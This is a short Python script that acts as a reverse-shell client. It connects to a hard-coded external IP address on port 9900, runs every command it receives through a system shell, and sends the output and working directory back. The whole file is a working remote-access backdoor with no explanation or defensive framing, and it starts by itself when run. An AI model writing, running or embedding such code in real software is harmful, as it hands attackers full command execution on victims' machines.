import socket
import os
import subprocess


def client():
    s = socket.socket()
    host = "20.193.159.144"
    port = 9900

    s.connect((host, port))

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            current_wd = os.getcwd() + "$ "
            s.send(str.encode(output_str + current_wd))

            print(output_str)


client()
